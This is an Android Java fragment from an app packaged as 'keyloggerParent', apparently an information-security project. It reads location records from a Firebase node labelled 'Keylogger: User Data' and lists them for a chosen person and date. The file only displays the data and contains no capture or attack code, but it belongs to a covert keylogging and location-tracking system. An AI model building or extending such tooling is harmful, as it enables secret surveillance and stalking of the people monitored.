package com.maemresen.infsec.keyloggerParent;

import android.os.Bundle;
import android.os.Handler;
import android.util.Log;
import android.view.LayoutInflater;
import android.view.View;
import android.view.ViewGroup;

import androidx.annotation.NonNull;
import androidx.annotation.Nullable;
import androidx.fragment.app.Fragment;
import androidx.recyclerview.widget.LinearLayoutManager;
import androidx.recyclerview.widget.RecyclerView;
import androidx.swiperefreshlayout.widget.SwipeRefreshLayout;

import com.airbnb.lottie.LottieAnimationView;
import com.airbnb.lottie.LottieDrawable;
import com.google.firebase.database.DataSnapshot;
import com.google.firebase.database.DatabaseError;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;
import com.google.firebase.database.ValueEventListener;

import java.util.ArrayList;
import java.util.List;

public class LocationFragment extends Fragment {
    private DatabaseReference allRecordsRef;
    private RecyclerView recyclerView;
    private BadWordsAdapter adapter;
    private List<String> textRecordsList;
    
    private LottieAnimationView loadingAnimationView;
    private boolean isLoading;
    private SwipeRefreshLayout swipeRefreshLayout;
    
    private static String ownerName = "";
    private static String selectedDate = "";
    
    @Nullable
    @Override
    public View onCreateView( @NonNull LayoutInflater inflater, @Nullable ViewGroup container, @Nullable Bundle savedInstanceState ) {
        View rootView = inflater.inflate( R.layout.location_layout, container, false );
        
        
        recyclerView = rootView.findViewById( R.id.Locaionrecycler );
        recyclerView.setLayoutManager( new LinearLayoutManager( getContext() ) );
        textRecordsList = new ArrayList<>();
        adapter = new BadWordsAdapter( textRecordsList );
        recyclerView.setAdapter( adapter );
        loadingAnimationView = rootView.findViewById( R.id.animationLocation );

        
        
        Bundle bundle = getArguments();
        if (bundle != null) {
            ownerName = bundle.getString( "OWNER_NAME" );
            selectedDate = bundle.getString( "SELECTED_DATE" );
        }
        
        UpdateFragment( ownerName, selectedDate );
        
        swipeRefreshLayout = rootView.findViewById( R.id.swipeLocation );
        swipeRefreshLayout.setOnRefreshListener( new SwipeRefreshLayout.OnRefreshListener() {
            @Override
            public void onRefresh() {
                // Perform the refresh operation
                if (ownerName != null || selectedDate != null) {
                    refreshData(ownerName,selectedDate);
                }
            }
        } );
        
        
        return rootView;
    }
    
    private void refreshData(String ownerName, String databaseName) {
        isLoading = true;
    
        recyclerView.setVisibility(View.GONE);
        // Update the fragment data using the existing ownerName and databaseName variables
        UpdateFragment(ownerName, databaseName);
        
        // Start the animation
        loadingAnimationView.setVisibility(View.VISIBLE);
        loadingAnimationView.playAnimation();
        
        // Simulate a delay before stopping the refresh animation
        new Handler().postDelayed(new Runnable() {
            @Override
            public void run() {
                swipeRefreshLayout.setRefreshing(false);
                loadingAnimationView.setVisibility(View.GONE);
                loadingAnimationView.cancelAnimation();
                recyclerView.setVisibility(View.VISIBLE);
    
            }
        }, 2500); // Delay for 2.5 seconds
    }
    
    
    public void UpdateFragment( String ownerName, String databaseName ) {
        
        allRecordsRef = FirebaseDatabase.getInstance().getReference( "Keylogger: User Data" )
                .child( ownerName )
                .child( databaseName )
                .child( "Location" );
        
        // Add a ValueEventListener to listen for changes in the data
        allRecordsRef.addValueEventListener( new ValueEventListener() {
            @Override
            public void onDataChange( @NonNull DataSnapshot dataSnapshot ) {
                textRecordsList.clear();
                
                for (DataSnapshot textRecordSnapshot : dataSnapshot.getChildren()) {
                    String textRecord = textRecordSnapshot.getValue( String.class );
                    textRecordsList.add( textRecord );
                }
                
                // Notify the adapter that the data has changed
                adapter.notifyDataSetChanged();
                
            }
            
            @Override
            public void onCancelled( @NonNull DatabaseError databaseError ) {
                // Handle errors that occur during data retrieval
                Log.e( "FirebaseError", "Data retrieval canceled: " + databaseError.getMessage() );
            }
            
        } );
    }
    
    @Override
    public void onResume() {
        super.onResume();
        
        UpdateFragment(ownerName, selectedDate);
        adapter.notifyDataSetChanged();
    }
}